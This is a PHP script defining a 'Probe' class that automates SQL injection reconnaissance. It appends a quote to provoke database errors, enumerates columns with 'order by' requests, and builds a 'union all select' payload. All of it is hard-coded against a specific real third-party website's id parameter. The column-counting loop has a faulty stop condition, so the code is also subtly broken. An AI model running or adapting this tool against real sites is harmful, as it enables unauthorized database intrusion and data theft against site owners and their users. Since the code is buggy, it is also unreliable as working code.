<?php

class Probe
{
	protected $url;

	public function __construct($url)
	{
		$this->url = $url;
	}

	/**
 	 * Returns SQL error
 	 *	
 	 * @param string $url
 	 * @return string
 	 */
	public function getError()
	{
		$headers = get_headers($this->url, 1);

		if ($headers[0] == 'HTTP/1.1 200 OK')
		{
			$errorUrl = $this->url . "'";

			$contents = file_get_contents($errorUrl);

			return $contents;
		}

		return NULL;
	}

	/**
 	 * Gets total number of columns
 	 *
 	 * @param string $url
 	 * @return string
 	 */

	public function getColumnNum()
	{
		$column = 1;
		do
		{
			$orderUrl = $this->url . " order by " . $column;

			$column++;

			$contents = file_get_contents($orderUrl);
		}
		while ($contents != substr('clause', 0));

		$getRange = implode (",", range(1, $column - 1));

		$shortUrl = substr_replace($this->url, "", -2);

		return $shortUrl . "null union all select " . $getRange . "--";
	}

	/**
 	 * Returns column number that is most vulnerable to injection 
 	 *
 	 * @param  string $url
 	 * @return string
 	 */
	public function getVulnerable()
	{
		//$test = $this->getColumnNum();

		$test = "http://www.slavsandtatars.com/about.php?id=null  union all select 1,2,3--";

		$contents = file_get_contents($test);

		return $contents;

		//get first occuring number and replace with sql injection code
	}
}

$probe = new Probe("http://www.slavsandtatars.com/about.php?id=25");

$testError = $probe->getError();

$testColumn = $probe->getColumnNum();

$testVulnerable = $probe->getVulnerable();

var_dump($testVulnerable);

?>